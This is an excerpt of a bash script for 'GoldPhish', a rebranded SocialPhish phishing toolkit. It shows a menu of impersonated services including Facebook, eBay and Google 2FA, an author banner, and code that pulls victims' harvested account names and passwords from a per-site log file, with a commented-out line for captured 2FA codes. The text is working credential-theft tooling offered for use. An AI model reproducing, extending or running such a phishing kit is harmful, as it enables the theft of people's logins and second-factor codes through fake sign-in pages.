#!/bin/bash
# GoldPhish, a rescripted version of SocialPhish v3.0
# Rescripted and Modified by: CosmicSuami
# Github: https://github.com/cosmicsuami
...
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m eBay\e[0m	       \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;91m Google 2FA    \e[0m\e[1;94m \n"
...
printf "\n"
printf "\e[1;93m       .:.:.:.\e[0m\e[1;77m CosmicSuami aka B: The Breach \e[0m\e[1;93m.:.:.:.\e[0m\n"
printf "\n"
}
...
#code=$(grep -o 'Code:.*' sites/$server/usernames.txt | cut -d ":" -f2 | xargs)
username=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d ":" -f2 | xargs)
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2 | xargs)

# Print the extracted code
#printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Code:\e[0m\e[1;77m %s\n\e[0m" "$code"
